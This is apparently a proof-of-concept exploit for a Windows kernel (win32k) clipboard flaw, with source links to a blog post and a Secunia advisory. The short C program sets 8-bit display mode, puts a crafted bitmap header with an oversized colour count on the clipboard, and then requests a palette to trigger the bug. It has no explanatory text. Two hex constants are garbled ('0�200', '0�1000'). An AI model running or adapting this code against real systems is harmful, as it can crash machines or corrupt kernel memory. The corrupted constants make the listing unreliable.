source:
http://www.ragestorm.net/blogs/?p=255
http://secunia.com/advisories/40870/


DEVMODE dm = {0};
dm.dmSize  = sizeof(DEVMODE);
dm.dmBitsPerPel = 8;
dm.dmPelsWidth = 800;
dm.dmPelsHeight = 600;
dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_BITSPERPEL;
ChangeDisplaySettings(&dm, 0);

BITMAPINFOHEADER bmih = {0};
bmih.biClrUsed = 0�200;

HGLOBAL h = GlobalAlloc(GMEM_FIXED, 0�1000);
memcpy((PVOID)GlobalLock(h), &bmih, sizeof(bmih));
GlobalUnlock(h);

OpenClipboard(NULL);
SetClipboardData(CF_DIBV5, (HANDLE)h);
CloseClipboard();

OpenClipboard(NULL);
GetClipboardData(CF_PALETTE);